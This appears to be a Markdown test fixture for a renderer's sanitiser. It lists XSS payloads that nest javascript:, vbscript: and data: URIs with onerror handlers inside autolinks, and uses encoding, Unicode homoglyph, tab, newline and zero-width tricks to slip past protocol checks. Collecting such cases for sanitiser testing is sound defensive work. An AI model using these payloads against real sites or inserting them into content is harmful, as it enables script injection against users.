# Edge Case Protocol Attacks

## Non-HTTP protocols in autolinks
<ftp://example.com/![test](javascript:alert('ftp-autolink'))>
<file:///etc/passwd/![test](javascript:alert('file-autolink'))>

## Protocol case variations in autolinks
<HTTP://example.com/![test](javascript:alert('http-upper'))>
<Https://example.com/![test](javascript:alert('https-mixed'))>

## Protocol with unusual characters
<http\s://example.com/![test](javascript:alert('backslash-protocol'))>
<http:///example.com/![test](javascript:alert('triple-slash'))>

## Protocol-relative URLs in autolinks
<//example.com/![test](javascript:alert('protocol-relative'))>

## Autolinks with data URIs
<data:text/html,<img src="x" onerror="alert('data-autolink')">

## Autolinks with javascript protocol
<javascript:alert('direct-js')>

## Autolinks with vbscript protocol
<vbscript:msgbox('vbs')>

## Autolinks with about protocol
<about:blank/![test](javascript:alert('about'))>

## Autolinks with chrome protocol
<chrome://settings/![test](javascript:alert('chrome'))>

## Autolinks with moz protocol
<moz-extension://id/![test](javascript:alert('moz'))>

## Autolinks with custom protocol
<myprotocol://example.com/![test](javascript:alert('custom'))>

## Autolinks with blob protocol
<blob:https://example.com/uuid/![test](javascript:alert('blob'))>

## Autolinks with filesystem protocol
<filesystem:https://example.com/temporary/![test](javascript:alert('filesystem'))>

## Autolinks with ws/wss protocols
<ws://example.com/![test](javascript:alert('websocket'))>
<wss://example.com/![test](javascript:alert('websocket-secure'))>

## Protocol smuggling via encoding
<htt%70://example.com/![test](javascript:alert('encoded-protocol'))>

## Protocol smuggling via unicode
<һttp://example.com/![test](javascript:alert('unicode-protocol'))>

## Protocol with control characters
<http:	//example.com/![test](javascript:alert('tab-protocol'))>
<http:
//example.com/![test](javascript:alert('newline-protocol'))>

## Protocol with zero-width characters
<http:​//example.com/![test](javascript:alert('zwsp-protocol'))>

## Mixed protocol schemes
<https://example.com/redirect?url=javascript:alert('redirect-js')>

## Protocol with unusual ports
<https://example.com:443/![test](javascript:alert('default-port'))>
<https://example.com:80/![test](javascript:alert('wrong-port'))>

## Protocol with IPv6
<https://[::1]/![test](javascript:alert('ipv6-localhost'))>
<https://[2001:db8::1]/![test](javascript:alert('ipv6-addr'))>